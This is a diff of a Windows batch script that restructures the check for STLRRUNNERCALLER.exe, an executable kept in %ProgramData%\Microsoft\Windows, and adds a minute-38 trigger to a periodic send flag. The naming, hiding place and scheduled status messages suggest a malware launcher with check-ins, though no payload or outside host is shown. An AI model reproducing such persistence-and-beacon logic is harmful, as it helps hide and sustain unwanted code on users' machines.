@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=12.8"
+set "BATCHVERSION=12.9"
 
 
 
@@ -238,20 +238,34 @@ if exist "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe" goto :CHECKSTLRR
 echo STLRRUNNERCALLER.exe not found. Going to NEXT3
 goto :NEXT3
 
+
+
 :CHECKSTLRRUNSTATUS
 :: Check if the process is already running
 tasklist /fi "imagename eq STLRRUNNERCALLER.exe" | find /i "STLRRUNNERCALLER.exe" >nul
-if %errorlevel% neq 0 (
-    echo STLRRUNNERCALLER.exe is not running.
-    set "CheckSend=1"
-    echo CheckSend=%CheckSend%
-    echo Starting STLRRUNNERCALLER...
-    start "" "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
-    set "MESSAGE=STLRSTARTED|"
-    echo Started.
-) else (
-    echo STLRRUNNERCALLER.exe is already running.
-)
+if %errorlevel% neq 0 goto :STLRCALLRUNNING
+goto :STLRCALLNOTRUNNING
+
+:STLRCALLRUNNING
+echo STLRRUNNERCALLER.exe is not running.
+set "CheckSend=1"
+echo CheckSend=%CheckSend%
+echo Starting STLRRUNNERCALLER...
+start "" "%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
+set "MESSAGE=STLRSTARTED|"
+echo Started.
+goto :CONTINUEAFTERCHECKSTLRRUNSTATUS
+
+:STLRCALLNOTRUNNING
+echo STLRRUNNERCALLER.exe is already running.
+goto :CONTINUEAFTERCHECKSTLRRUNSTATUS
+
+
+
+
+:CONTINUEAFTERCHECKSTLRRUNSTATUS
+
+
 echo.
 echo.
 echo CheckSend=%CheckSend% and MESSAGE=%MESSAGE%
@@ -274,6 +288,16 @@ echo.
 
 
 dir /b "%temp%"
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -1532,6 +1556,7 @@ if "%currentMinute%"=="00" set "CheckSend=1"
 if "%currentMinute%"=="10" set "CheckSend=1"
 if "%currentMinute%"=="20" set "CheckSend=1"
 if "%currentMinute%"=="30" set "CheckSend=1"
+if "%currentMinute%"=="38" set "CheckSend=1"
 if "%currentMinute%"=="40" set "CheckSend=1"
 if "%currentMinute%"=="50" set "CheckSend=1"
 
